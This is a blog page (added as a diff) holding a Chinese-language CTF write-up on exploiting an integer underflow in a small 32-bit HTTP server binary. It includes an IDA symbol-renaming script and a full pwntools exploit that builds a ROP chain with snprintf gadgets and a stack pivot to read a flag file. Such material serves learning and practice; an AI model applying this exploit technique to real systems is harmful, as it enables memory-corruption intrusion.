@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+<meta name="google-site-verification" content="lzzy81dXBMl3CL0W3rihaSIaVK5AarDtjDI7NuLjWo0" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="先恢复一下符号表 objdump -R xx_easy_server 1234567891011121314151617181920212223242526272829303132333435363738394041424344str1 &#x3D; &#39;&#39;&#39;0804c768 R_386_JUMP_SLOT   strstr@GLIBC_2.00804c76c R_386_J">
+<meta property="og:type" content="article">
+<meta property="og:title" content="不知道来源哪里的pwn题">
+<meta property="og:url" content="http://example.com/2021/06/16/xx_easy_server/index.html">
+<meta property="og:site_name" content="Fruit&#39;s Blogs">
+<meta property="og:description" content="先恢复一下符号表 objdump -R xx_easy_server 1234567891011121314151617181920212223242526272829303132333435363738394041424344str1 &#x3D; &#39;&#39;&#39;0804c768 R_386_JUMP_SLOT   strstr@GLIBC_2.00804c76c R_386_J">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/06/16/xx_easy_server/themes/blog/source_posts/xx_easy_server/image-20210617153215119.png">
+<meta property="og:image" content="http://example.com/2021/06/16/xx_easy_server/themes/blog/source_posts/xx_easy_server/image-20210617153907518.png">
+<meta property="og:image" content="http://example.com/2021/06/16/xx_easy_server/themes/blog/source_posts/xx_easy_server/image-20210617154102824.png">
+<meta property="article:published_time" content="2021-06-16T08:48:18.495Z">
+<meta property="article:modified_time" content="2021-07-10T02:06:36.481Z">
+<meta property="article:author" content="fruit">
+<meta property="article:tag" content="二进制">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/06/16/xx_easy_server/themes/blog/source_posts/xx_easy_server/image-20210617153215119.png">
+
+<link rel="canonical" href="http://example.com/2021/06/16/xx_easy_server/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>不知道来源哪里的pwn题 | Fruit's Blogs</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Fruit's Blogs</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/16/xx_easy_server/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/violin.jpg">
+      <meta itemprop="name" content="fruit">
+      <meta itemprop="description" content="问灵十三载，等一不归人  欢迎交流：3209820155qq 添加备注：blog">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Fruit's Blogs">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          不知道来源哪里的pwn题
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-06-16 16:48:18" itemprop="dateCreated datePublished" datetime="2021-06-16T16:48:18+08:00">2021-06-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-07-10 10:06:36" itemprop="dateModified" datetime="2021-07-10T10:06:36+08:00">2021-07-10</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>先恢复一下符号表</p>
+<p>objdump -R xx_easy_server</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">str1 &#x3D; &#39;&#39;&#39;0804c768 R_386_JUMP_SLOT   strstr@GLIBC_2.0</span><br><span class="line">0804c76c R_386_JUMP_SLOT   strcmp@GLIBC_2.0</span><br><span class="line">0804c770 R_386_JUMP_SLOT   strcspn@GLIBC_2.0</span><br><span class="line">0804c774 R_386_JUMP_SLOT   fgets@GLIBC_2.0</span><br><span class="line">0804c778 R_386_JUMP_SLOT   fclose@GLIBC_2.1</span><br><span class="line">0804c77c R_386_JUMP_SLOT   time@GLIBC_2.0</span><br><span class="line">0804c780 R_386_JUMP_SLOT   alarm@GLIBC_2.0</span><br><span class="line">0804c784 R_386_JUMP_SLOT   fwrite@GLIBC_2.0</span><br><span class="line">0804c788 R_386_JUMP_SLOT   fread@GLIBC_2.0</span><br><span class="line">0804c78c R_386_JUMP_SLOT   strcpy@GLIBC_2.0</span><br><span class="line">0804c790 R_386_JUMP_SLOT   malloc@GLIBC_2.0</span><br><span class="line">0804c794 R_386_JUMP_SLOT   strftime@GLIBC_2.0</span><br><span class="line">0804c798 R_386_JUMP_SLOT   strchr@GLIBC_2.0</span><br><span class="line">0804c79c R_386_JUMP_SLOT   strlen@GLIBC_2.0</span><br><span class="line">0804c7a0 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804c7a4 R_386_JUMP_SLOT   fprintf@GLIBC_2.0</span><br><span class="line">0804c7a8 R_386_JUMP_SLOT   strcasecmp@GLIBC_2.0</span><br><span class="line">0804c7ac R_386_JUMP_SLOT   __isoc99_sscanf@GLIBC_2.7</span><br><span class="line">0804c7b0 R_386_JUMP_SLOT   setvbuf@GLIBC_2.0</span><br><span class="line">0804c7b4 R_386_JUMP_SLOT   fopen@GLIBC_2.1</span><br><span class="line">0804c7b8 R_386_JUMP_SLOT   gmtime@GLIBC_2.0</span><br><span class="line">0804c7bc R_386_JUMP_SLOT   memset@GLIBC_2.0</span><br><span class="line">0804c7c0 R_386_JUMP_SLOT   snprintf@GLIBC_2.0</span><br><span class="line">0804c7c4 R_386_JUMP_SLOT   strncpy@GLIBC_2.0</span><br><span class="line">0804c7c8 R_386_JUMP_SLOT   fileno@GLIBC_2.0</span><br><span class="line">0804c7cc R_386_JUMP_SLOT   strncasecmp@GLIBC_2.0</span><br><span class="line">0804c7d0 R_386_JUMP_SLOT   vfprintf@GLIBC_2.0</span><br><span class="line">0804c7d4 R_386_JUMP_SLOT   atoi@GLIBC_2.0</span><br><span class="line">0804c7d8 R_386_JUMP_SLOT   strncmp@GLIBC_2.0</span><br><span class="line">0804c7dc R_386_JUMP_SLOT   strspn@GLIBC_2.0</span><br><span class="line">0804c7e0 R_386_JUMP_SLOT   strncat@GLIBC_2.0&#39;&#39;&#39;</span><br><span class="line">lists &#x3D; str1.split(&#39;\n&#39;)</span><br><span class="line">func_list &#x3D; []</span><br><span class="line">for i in lists:</span><br><span class="line">    func_list.append(i.split(&#39;   &#39;)[1].split(&#39;@&#39;)[0] + &#39;_5&#39;)</span><br><span class="line">print(func_list)</span><br><span class="line"></span><br><span class="line">start_addr &#x3D; 0x08048750</span><br><span class="line">end_addr &#x3D; 0x8048930</span><br><span class="line">i &#x3D; start_addr</span><br><span class="line"></span><br><span class="line">while(i&lt;&#x3D;end_addr):</span><br><span class="line">    idc.set_name(i, func_list[int((i-0x08048750)&#x2F;0x10)])</span><br><span class="line">    i +&#x3D; 0x10</span><br></pre></td></tr></table></figure>
+
+<p>以前没逆过这种类型的  如果逆过就很快了   就是一个http_server服务</p>
+<p>进到核心函数里面</p>
+<p><img src="/2021/06/16/xx_easy_server/themes\blog\source_posts\xx_easy_server\image-20210617153215119.png" alt="image-20210617153215119"></p>
+<p>这个memory[xxxx]  就是栈中的数据，  但是我恢复不了  凑合着也能看</p>
+<p>首先输入一个post/get  /xxx(目录名字)  xxx的形式  </p>
+<p>再循环输入xxxx（content length host 之类的信息）</p>
+<p>再看其中的一些处理过程</p>
+<p><img src="/2021/06/16/xx_easy_server/themes\blog\source_posts\xx_easy_server\image-20210617153907518.png" alt="image-20210617153907518"></p>
+<p>漏洞点：</p>
+<p>9998-len  如果len &gt; 9998 就变成了负数   我虽然是个pwn新手  这种类型的没见过几次  但也略有感觉   似乎在某个oj中遇到过</p>
+<p><img src="/2021/06/16/xx_easy_server/themes\blog\source_posts\xx_easy_server\image-20210617154102824.png" alt="image-20210617154102824"></p>
+<p>exp：（参考了别人的，不过最终是懂了）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf<span class="number">-8</span> -*-</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">elf = ELF(&#x27;.xx_easy_server&#x27;)</span><br><span class="line">p = process(&#x27;.xx_easy_server&#x27;)</span><br><span class="line"><span class="meta">#bss =</span></span><br><span class="line"><span class="meta"># post /aaa.html aaaaaa</span></span><br><span class="line"><span class="meta"># leave : mov esp, ebp; pop ebp;</span></span><br><span class="line">#</span><br><span class="line">main_addr = <span class="number">0x080491EB</span></span><br><span class="line">fwrite_plt = <span class="number">0x80487C0</span></span><br><span class="line">fwrite_got = <span class="number">0x804C028</span></span><br><span class="line">ret = <span class="number">0x08048722</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08049a8b</span></span><br><span class="line">pppp_ret = <span class="number">0x08049a88</span> <span class="meta">#pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#x27;</span></span><br><span class="line">ppp_ret = <span class="number">0x08049a89</span></span><br><span class="line">leave_ret = <span class="number">0x080489b8</span></span><br><span class="line">snprintf_plt = <span class="number">0x080488B0</span></span><br><span class="line">fmt_s = <span class="number">0x8049ab9</span> #<span class="string">&quot;%s\n&quot;</span></span><br><span class="line">char_dot = <span class="number">0x8048431</span> #<span class="string">&quot;.&quot;</span></span><br><span class="line">char_sep = <span class="number">0x8049f19</span> #<span class="string">&quot;/&quot;</span></span><br><span class="line">char_f = <span class="number">0x8048490</span> #<span class="string">&quot;f&quot;</span></span><br><span class="line">char_l = <span class="number">0x8049d9b</span> #<span class="string">&quot;l&quot;</span></span><br><span class="line">char_a = <span class="number">0x8049f10</span> #<span class="string">&quot;a&quot;</span></span><br><span class="line">char_g = <span class="number">0x8048489</span> #<span class="string">&quot;g&quot;</span></span><br><span class="line">target_addr = <span class="number">0x804C695</span></span><br><span class="line">data_do_file = <span class="number">0x804c4d0</span></span><br><span class="line">p2p = <span class="number">0x804db7c</span>  #.data  begin   why?????????? ida直接search  立即数   <span class="number">0x804c0a0</span></span><br><span class="line">target_stack = <span class="number">0x804CA32</span>#<span class="number">0x804C0C7</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># snprintf(target, length, fmt, src)</span></span><br><span class="line">def rop_write_to(target, src, length, fmt):</span><br><span class="line">    rop = p32(snprintf_plt) + p32(pppp_ret)</span><br><span class="line">    rop += p32(target) + p32(length) + p32(fmt) + p32(src)</span><br><span class="line">    <span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rop_write_char_to(target, <span class="keyword">char</span>):</span><br><span class="line">    <span class="keyword">return</span> rop_write_to(target, <span class="keyword">char</span>, <span class="number">2</span>, fmt_s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rop_write_addr_to(target, ptr2addr):</span><br><span class="line">    <span class="keyword">return</span> rop_write_to(target, ptr2addr, <span class="number">5</span>, fmt_s)</span><br><span class="line">payload = p32(<span class="number">0xdeadbeef</span>)*(<span class="number">0xea68</span><span class="comment">//4) + p32(0)# padding + len( = [ebp-0x48])</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xea9c</span>, b<span class="string">&quot;B&quot;</span>)  #</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">bypass these</span><br><span class="line">.text:<span class="number">080499</span>C0                 mov     eax, [ebp<span class="number">-14</span>h]</span><br><span class="line">.text:<span class="number">080499</span>C3                 mov     eax, [eax+<span class="number">10</span>h]</span><br><span class="line">.text:<span class="number">080499</span>C6                 mov     edx, ds:dword_804C690</span><br><span class="line">.text:<span class="number">080499</span>CC                 sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">080499</span>CF                 push    edx</span><br><span class="line">.text:<span class="number">080499</span>D0                 lea     edx, [ebp<span class="number">-111</span>C0h]</span><br><span class="line">.text:<span class="number">080499</span>D6                 push    edx</span><br><span class="line">.text:<span class="number">080499</span>D7                 call    eax</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload += p32(<span class="number">0x0804c4d8</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xeab4</span>, b<span class="string">&quot;C&quot;</span>)</span><br><span class="line"><span class="meta">#payload += rop_write_addr_to(target_addr,</span></span><br><span class="line">#fopen(&#x27;./flag&#x27;,&quot;r&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += rop_write_addr_to(target_stack - <span class="number">0xc</span>, data_do_file)  <span class="meta"># copy do_file() addr</span></span><br><span class="line">payload += rop_write_addr_to(target_stack - <span class="number">0x4</span>, p2p)  <span class="meta"># copy filename addr</span></span><br><span class="line">payload += rop_write_addr_to(target_stack, <span class="number">0x804c684</span>)  <span class="meta"># copy stdout addr</span></span><br><span class="line">payload += rop_write_char_to(<span class="number">0x804c0a0</span>, char_dot)</span><br><span class="line">payload += rop_write_char_to(<span class="number">0x804c0a0</span> + <span class="number">1</span>, char_sep)  <span class="meta"># construct filename</span></span><br><span class="line">payload += rop_write_char_to(<span class="number">0x804c0a0</span> + <span class="number">2</span>, char_f)</span><br><span class="line">payload += rop_write_char_to(<span class="number">0x804c0a0</span> + <span class="number">3</span>, char_l)</span><br><span class="line">payload += rop_write_char_to(<span class="number">0x804c0a0</span> + <span class="number">4</span>, char_a)</span><br><span class="line">payload += rop_write_char_to(<span class="number">0x804c0a0</span> + <span class="number">5</span>, char_g)</span><br><span class="line">payload += p32(pop_ebp_ret) + p32(target_stack - <span class="number">0x10</span>)  <span class="meta"># set new stack</span></span><br><span class="line">payload += p32(leave_ret)  <span class="meta"># migrate stack</span></span><br><span class="line"><span class="meta">#fwrite need stream.</span></span><br><span class="line"><span class="meta">#payload += p32(fwrite_plt) + p32(pppp_ret) + p32(0x8049AE0) + p32(1) + p32(0x19) + p32(0x0804C690)</span></span><br><span class="line"><span class="meta"># begin eip  ---  only use rop</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#print hex(len((payload)))</span></span><br><span class="line">gdb.attach(p , &#x27;b *0x08049a88\n&#x27;)</span><br><span class="line">p.sendline(&#x27;post /&#123;&#125;/ aaaa&#x27;.format(&#x27;a&#x27; * 0x2700))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;\n&#x27;</span>) #</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)<span class="meta">#file content  # 0xeb  len = 0x270f</span></span><br><span class="line">p.shutdown(direction = <span class="string">&quot;send&quot;</span>) <span class="meta"># send EOF</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>除了任意读  还可以泄露libc，然后通过libc库查看libc版本。</p>
+<p> 但是最后能不能进system我没试</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" rel="tag"># 二进制</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/06/glibc%E4%BD%8E%E7%89%88%E6%9C%AC%E5%88%B0%E9%AB%98%E7%89%88%E6%9C%AC%E5%88%87%E6%8D%A2/" rel="prev" title="glibc低版本到高版本切换">
+      <i class="fa fa-chevron-left"></i> glibc低版本到高版本切换
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="fruit"
+      src="/images/violin.jpg">
+  <p class="site-author-name" itemprop="name">fruit</p>
+  <div class="site-description" itemprop="description">问灵十三载，等一不归人  欢迎交流：3209820155qq 添加备注：blog</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+	
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fruit</span>
+  <span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_pv">
+	<span class="post-meta-item-icon">
+		<i class="fa fa-eye"></i>
+	</span>
+	访问量：<span id="busuanzi_value_site_pv"></span> 次数
+</span>
+
+<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_uv">
+	访客数：<span id="busuanzi_value_site_uv"></span> 人次
+</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
